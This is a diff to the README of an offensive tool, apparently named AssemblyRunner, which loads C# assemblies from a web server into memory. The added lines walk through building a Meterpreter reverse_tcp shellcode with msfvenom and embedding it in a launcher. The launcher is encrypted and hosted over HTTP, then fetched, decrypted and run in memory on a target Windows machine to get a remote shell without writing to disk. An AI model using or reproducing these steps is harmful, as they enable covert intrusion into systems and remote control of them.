@@ -6,11 +6,11 @@ cat Seatbelt.exe | base64 -w0 > seatbelt.b64
 Host on a webserver like Apache or Python Simple HTTP Server etc.
 Windows: 
 AssemblyRunner.exe -net http://IP/seatbelt.b64 "BasicOSInfo"
-Result: File is retreived over HTTP in-memory, base64 decoded, and then executed
+Result: File is retreived over HTTP in-memory, base64 decoded, and then executed with the BasicOSInfo argument.
 
 EXAMPLE:
-Compile a C# binary, such as AssemblyRunner/AssemblyRunner/Launchers/shellcodelauncher.cs that is included in this repo.
-Goal Remotely execute a C# Assembly without touching disk.
+Compile a C# binary, such as AssemblyRunner/AssemblyRunner/Launchers/shellcodelauncher.cs that is included in this repo to get a meterpreter shell.
+Goal Remotely execute a C# Assembly without touching disk and gain a remote shell.
 Kali:
 msfvenon -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -22,4 +22,20 @@ byte[] buf = new byte[510] { 0xfc0x48...... }
 <SNIPPED>
 
 copy byte length from output, 510 in this example and shellcode between curly braces {} to the shellcodelauncher.cs file
-compile this 
+Update the shellcode variable on line 48 with this new info so it looks like below:
+byte[] shellcode = new byte[510] {
+0xfc,0x48.......0x5d };
+
+compile the shellcodelauncher.cs file, Visual Studio is easiest
+compile AssemblyRunner, but do not move to target yet.
+
+On a non-target Windows System run
+AssemblyRunner.exe -file PASSWORD ShellCodeLauncher.exe
+This will be saved as encrypt_local.txt, host the file on a webserver like Apache or Python Simple HTTP Server etc.
+Move AssemblyRunner.exe to target Windows system.
+Windows Target System:
+AssemblyRunner.exe -rdecno PASSWORD http://IP/encrypt_local.txt
+(Enjoy your Shell)
+RESULT: Encrypted file is retreived over HTTP in-memory, decrypted, base64 decoded, and then executed without Arguments
+
+
